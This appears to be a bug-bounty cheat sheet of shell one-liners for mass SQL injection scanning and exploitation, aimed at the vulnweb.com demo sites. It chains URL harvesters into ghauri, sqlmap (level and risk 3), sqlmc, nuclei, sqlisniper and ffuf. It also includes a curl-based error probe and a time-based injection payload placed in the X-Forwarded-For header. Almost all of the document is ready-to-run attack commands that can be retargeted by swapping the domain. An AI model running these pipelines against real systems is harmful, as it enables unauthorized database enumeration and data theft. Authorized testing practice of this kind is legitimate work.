# SQLis

### waymore, qsreplace, gf, ghauri

```
waymore -i "testphp.vulnweb.com" -n -mode U | qsreplace -a "FUZZ" | grep "FUZZ" | sed 's/FUZZ//g' | gf sqli | sort -u | while read urls; do ghauri -u "$urls" --dbs --threads 2 --batch --level 2 | tee -a ghauri.sqli.txt; done
```

### waymore, qsreplace, gf, sqlmc

```
waymore -i "testphp.vulnweb.com" -n -mode U | qsreplace -a "FUZZ" | grep "FUZZ" | sed 's/FUZZ//g' | gf sqli | sort -u | while read urls; do sqlmc --url "$urls" -d 3 -o sqlmc.txt; done
```

### waymore, qsreplace, gf, nuclei

```
waymore -i "testphp.vulnweb.com" -n -mode U | qsreplace -a "FUZZ" | grep "FUZZ" | sed 's/FUZZ//g' | gf sqli | sort -u | nuclei -t ~/nuclei-templates/dast/vulnerabilities/sqli/sqli-error-based.yaml -dast -o nuclei_sqli.txt
```


### waybackurls, gf, sqlmap

```
waybackurls | sort -u | gf sqli >> sqli; sqlmap -m sqli --batch --random-agent --level 3 --risk 3
```

### subfinder, httpx, waybackurls, gf, ghauri

```
subfinder -d vulnweb.com -recursive -all -silent | httpx | waybackurls | sort -u | gf sqli | sort -u | while read urls; do ghauri -u "$urls" --dbs --threads 2 --batch --level 2 | tee -a ghauri.sqli.txt; done
```

### waymore

```
waymore -i "testphp.vulnweb.com" -n -mode U | grep ".php" | sed 's/\.php.*/.php\//' | sort -u | sed s/$/%27%22%60/ | while read url do ; do curl --silent "$url" | grep -qs "You have an error in your SQL syntax" && echo -e "$url \e[1;32mSQLI by Cybertix\e[0m" || echo -e "$url \e[1;31mNot Vulnerable to SQLI Injection\e[0m" ;done
```


# Blind SQLis

### waymore, qsreplace, gf, sqlisniper

```
waymore -i "testphp.vulnweb.com" -n -mode U | qsreplace -a "FUZZ" | grep "FUZZ" | sed 's/FUZZ//g' | gf sqli | sort -u | while read urls; do sqlisniper -p -u "$urls" --payload /usr/share/wordlists/my-payloads/SQLi/Blind-SQLis/bsqli-sniper.txt --headers /opt/sqli/SqliSniper/headers.txt -o SQLi_blind_sniper.txt; done
```

### waybackurls

```
waybackurls -no-subs testphp.vulnweb.com | grep -E '\bhttps?://\S+?=\S+' | grep -E '\.php|\.asp' | sort -u | sed 's/\(=[^&]*\)/=/g' | tee urls.txt | sort -u -o urls.txt 
```

### waymore, qsreplace, gf, ffuf

```
waymore -i "testphp.vulnweb.com" -n -mode U | qsreplace "FUZZ" | gf sqli | sort -u | while read urls; do ffuf -u "$urls" -w /usr/share/wordlists/my-payloads/SQLi/Blind-SQLis/blind-sqli.txt -mt ">18000" -v -mc 200 -enc FUZZ:urlencode -timeout 150 -o SQLi_blind_ffuf.json; done
```


# Header based SQLis

```
subfinder -d vulnweb.com -recursive -all -silent | httpx -silent -H "X-Forwarded-For: 'XOR(if(now()=sysdate(),sleep(13),0))OR" -rt -timeout 20 -mrt '>13' | tee -a header_based_bsqli.txt
```




# Resources

https://github.com/Gerxnox/One-Liner-Collections

https://github.com/0xPugal/One-Liners

https://github.com/daffainfo/Oneliner-Bugbounty

https://github.com/thecybertix/One-Liner-Collections

https://github.com/dwisiswant0/awesome-oneliner-bugbounty
